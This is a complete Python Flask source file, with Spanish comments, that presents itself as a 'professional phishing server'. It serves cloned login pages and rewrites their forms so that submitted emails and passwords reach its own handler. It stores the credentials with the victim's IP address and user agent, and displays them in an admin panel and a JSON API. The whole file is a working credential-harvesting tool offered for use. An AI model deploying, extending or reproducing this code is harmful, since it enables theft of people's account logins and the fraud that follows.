#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🎯 SERVIDOR DE PHISHING FLASK PROFESIONAL
Creado por: MAT1520
GitHub: https://github.com/mat1520
Telegram: https://t.me/MAT3810

Sistema profesional para despliegue y gestión de sitios de phishing
con captura de credenciales y panel de administración avanzado.
"""

from flask import Flask, render_template, request, redirect, url_for, send_from_directory, jsonify
import os
import json
import datetime
import sqlite3
import threading

app = Flask(__name__)
app.secret_key = 'phishing_server_professional_2024'

# Configuración
SITES_DIR = 'sites'
LOGOS_DIR = 'logos'
CREDENTIALS_DB = 'credentials.db'
STATIC_FILES = ['css', 'js', 'png', 'jpg', 'jpeg', 'gif', 'svg', 'ico', 'woff', 'woff2', 'ttf', 'eot']
deployed_sites = set()  # Sitios actualmente desplegados

# Lock para thread safety
db_lock = threading.Lock()

class DatabaseManager:
    def __init__(self, db_path):
        self.db_path = db_path
        self.init_database()
    
    def init_database(self):
        """Inicializa la base de datos"""
        with db_lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS credentials (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    site_name TEXT NOT NULL,
                    email TEXT,
                    password TEXT,
                    extra_data TEXT,
                    ip_address TEXT,
                    user_agent TEXT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            conn.commit()
            conn.close()
    
    def save_credentials(self, site_name, email=None, password=None, extra_data=None, ip_address=None, user_agent=None):
        """Guarda credenciales capturadas"""
        with db_lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO credentials (site_name, email, password, extra_data, ip_address, user_agent)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (site_name, email, password, extra_data, ip_address, user_agent))
            conn.commit()
            conn.close()
    
    def get_credentials(self, site_filter=None):
        """Obtiene todas las credenciales"""
        with db_lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            if site_filter:
                cursor.execute('SELECT * FROM credentials WHERE site_name = ? ORDER BY timestamp DESC', (site_filter,))
            else:
                cursor.execute('SELECT * FROM credentials ORDER BY timestamp DESC')
            credentials = cursor.fetchall()
            conn.close()
            return credentials

# Inicializar base de datos
db_manager = DatabaseManager(CREDENTIALS_DB)

def get_available_sites():
    """Obtiene la lista de sitios disponibles"""
    if not os.path.exists(SITES_DIR):
        return []
    
    sites = []
    for site_name in os.listdir(SITES_DIR):
        site_path = os.path.join(SITES_DIR, site_name)
        if os.path.isdir(site_path):
            sites.append({
                'name': site_name,
                'path': site_path,
                'has_login': os.path.exists(os.path.join(site_path, 'login.html')),
                'has_index': os.path.exists(os.path.join(site_path, 'index.php')),
                'deployed': site_name in deployed_sites
            })
    return sites

def get_logo_mapping():
    """Mapea sitios con sus logos disponibles"""
    logo_map = {}
    if os.path.exists(LOGOS_DIR):
        for logo_file in os.listdir(LOGOS_DIR):
            if logo_file.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.svg')):
                site_name = logo_file.split('.')[0].lower()
                logo_map[site_name] = logo_file
    return logo_map

@app.route('/')
def index():
    """Página principal del servidor"""
    sites = get_available_sites()
    logo_map = get_logo_mapping()
    
    # Agregar información de logos a los sitios
    for site in sites:
        site['logo'] = logo_map.get(site['name'].lower(), 'default.png')
    
    return render_template('index_dark.html', sites=sites, total_sites=len(sites))

@app.route('/deploy/<site_name>')
def deploy_site(site_name):
    """Despliega un sitio (lo marca como activo)"""
    sites = get_available_sites()
    site_names = [s['name'] for s in sites]
    
    if site_name not in site_names:
        return redirect(url_for('index'))
    
    deployed_sites.add(site_name)
    return redirect(url_for('site_status', site_name=site_name))

@app.route('/stop/<site_name>')
def stop_site(site_name):
    """Detiene un sitio (lo marca como inactivo)"""
    deployed_sites.discard(site_name)
    return redirect(url_for('index'))

@app.route('/site-status/<site_name>')
def site_status(site_name):
    """Muestra el estado de un sitio desplegado"""
    if site_name not in deployed_sites:
        return redirect(url_for('deploy_site', site_name=site_name))
    
    return render_template('site_status_dark.html', site_name=site_name)

@app.route('/phish/<site_name>/')
def serve_phishing_site_root(site_name):
    """Sirve la página principal del sitio de phishing"""
    if site_name not in deployed_sites:
        return redirect(url_for('deploy_site', site_name=site_name))
    
    site_path = os.path.join(SITES_DIR, site_name)
    if not os.path.exists(site_path):
        return f"Sitio '{site_name}' no encontrado", 404
    
    # Priorizar login.html sobre index.php
    login_path = os.path.join(site_path, 'login.html')
    if os.path.exists(login_path):
        return serve_phishing_file(site_name, 'login.html')
    
    index_path = os.path.join(site_path, 'index.php')
    if os.path.exists(index_path):
        return serve_phishing_file(site_name, 'index.php')
    
    return f"Sitio {site_name} sin contenido disponible", 404

@app.route('/phish/<site_name>/<filename>')
def serve_phishing_file(site_name, filename):
    """Sirve archivos específicos del sitio de phishing"""
    if site_name not in deployed_sites:
        return redirect(url_for('deploy_site', site_name=site_name))
    
    site_path = os.path.join(SITES_DIR, site_name)
    file_path = os.path.join(site_path, filename)
    
    if not os.path.exists(file_path):
        return f"Archivo '{filename}' no encontrado", 404
    
    # Archivos estáticos
    file_ext = filename.split('.')[-1].lower()
    if file_ext in STATIC_FILES:
        return send_from_directory(site_path, filename)
    
    # Archivos HTML/PHP
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        # Procesar contenido para actualizar formularios
        content = process_site_content(content, site_name)
        return content, 200, {'Content-Type': 'text/html; charset=utf-8'}
    
    except Exception as e:
        return f"Error al cargar archivo: {str(e)}", 500

def process_site_content(content, site_name):
    """Procesa el contenido del sitio para actualizar formularios"""
    # Actualizar action de formularios
    content = content.replace('action="login.php"', f'action="/phish/{site_name}/login.php"')
    content = content.replace("action='login.php'", f"action='/phish/{site_name}/login.php'")
    
    # Comentar redirects PHP
    content = content.replace("header('Location:", "// header('Location:")
    content = content.replace('header("Location:', '// header("Location:')
    
    return content

@app.route('/phish/<site_name>/login.php', methods=['POST'])
@app.route('/phish/<site_name>/login', methods=['POST'])
def handle_phishing_login(site_name):
    """Maneja el envío de formularios de login"""
    try:
        form_data = request.form.to_dict()
        
        # Extraer credenciales comunes
        email = (form_data.get('email') or form_data.get('username') or 
                form_data.get('user') or form_data.get('login'))
        password = (form_data.get('pass') or form_data.get('password') or 
                   form_data.get('passwd'))
        
        # Datos adicionales como JSON
        extra_data = json.dumps(form_data) if form_data else None
        
        # Guardar credenciales
        db_manager.save_credentials(
            site_name=site_name,
            email=email,
            password=password,
            extra_data=extra_data,
            ip_address=request.environ.get('HTTP_X_REAL_IP', request.remote_addr),
            user_agent=request.headers.get('User-Agent')
        )
        
        print(f"✅ Credenciales capturadas de {site_name}: {email}")
        
        # Redirigir al sitio original o mostrar error
        return redirect(f'/phish/{site_name}/')
        
    except Exception as e:
        print(f"❌ Error capturando credenciales: {e}")
        return redirect(f'/phish/{site_name}/')

@app.route('/admin')
def admin():
    """Panel de administración"""
    credentials = db_manager.get_credentials()
    
    # Formatear credenciales para el template
    formatted_credentials = []
    sites = set()
    
    for cred in credentials:
        formatted_credentials.append({
            'id': cred[0],
            'site_name': cred[1],
            'email': cred[2],
            'password': cred[3],
            'extra_data': cred[4],
            'ip_address': cred[5],
            'user_agent': cred[6],
            'timestamp': cred[7]
        })
        sites.add(cred[1])
    
    return render_template('admin_dark.html', 
                         credentials=formatted_credentials, 
                         sites=sorted(sites),
                         total_credentials=len(formatted_credentials))

@app.route('/logos/<filename>')
def serve_logo(filename):
    """Sirve los logos de los sitios"""
    return send_from_directory(LOGOS_DIR, filename)

@app.route('/api/credentials')
def api_credentials():
    """API para obtener credenciales (AJAX)"""
    site_filter = request.args.get('site')
    credentials = db_manager.get_credentials(site_filter)
    
    formatted_credentials = []
    for cred in credentials:
        formatted_credentials.append({
            'id': cred[0],
            'site_name': cred[1],
            'email': cred[2],
            'password': cred[3],
            'extra_data': cred[4],
            'ip_address': cred[5],
            'user_agent': cred[6],
            'timestamp': cred[7]
        })
    
    return jsonify(formatted_credentials)

if __name__ == '__main__':
    print("=" * 50)
    print("🎯 SERVIDOR DE PHISHING FLASK PROFESIONAL")
    print("=" * 50)
    print(f"📊 Sitios disponibles: {len(get_available_sites())}")
    print("🌐 Servidor iniciando en http://localhost:5000")
    print("👨‍💼 Panel de administración: http://localhost:5000/admin")
    print()
    print("👤 Creado por: MAT1520")
    print("🔗 GitHub: https://github.com/mat1520")
    print("📱 Telegram: https://t.me/MAT3810")
    print()
    print("🚀 FUNCIONALIDADES:")
    print("  • Despliegue rápido de sitios de phishing")
    print("  • Captura automática de credenciales")
    print("  • Panel de administración en tiempo real")
    print("  • Interfaz moderna y profesional")
    print("  • Compatible con Windows/Linux/Mac")
    print()
    print("Ctrl+C para detener")
    print("=" * 50)
    
    app.run(host='0.0.0.0', port=5000, debug=True, threaded=True)
